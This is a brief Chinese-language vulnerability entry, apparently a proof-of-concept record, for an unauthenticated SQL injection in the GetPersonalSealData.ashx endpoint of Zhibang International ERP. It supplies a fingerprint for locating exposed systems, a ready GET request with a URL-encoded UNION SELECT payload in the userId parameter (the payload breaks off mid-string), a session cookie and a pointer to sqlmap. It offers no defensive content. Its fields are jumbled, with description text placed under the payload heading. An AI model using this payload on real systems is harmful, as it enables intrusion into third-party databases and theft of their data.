# 智邦国际ERPGetPersonalSealData.ashx接口SQL注入漏洞

- **系统**：智邦国际ERPGetPersonalSealData.ashx接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="0ab4ed9764a33fd85da03b00f44393e1"`
- **请求**：`GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=%31%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%32%32%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%36%38%29%2b%43%`
- **关键头**：`Cookie: ASP.NET_SessionId=o0oxkf2lkudmy5ueprfeapbl`

**请求体 / payload**
```
智邦国际ERP系统 GetPersonalSealData.ashx接口处存在SQL注入漏洞，未经身份认证的攻击者可利用此漏洞获取数据库敏感信息，深入利用可获取服务器权限。
qzbbqDnuoIViFWuALhRoiXvKeCeEYeBGlBImeTUAnAbdWqqqqq
sqlmap
/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=1
>
```

**其他**
- 智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞: + 一、漏洞复现
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 智邦国际ERP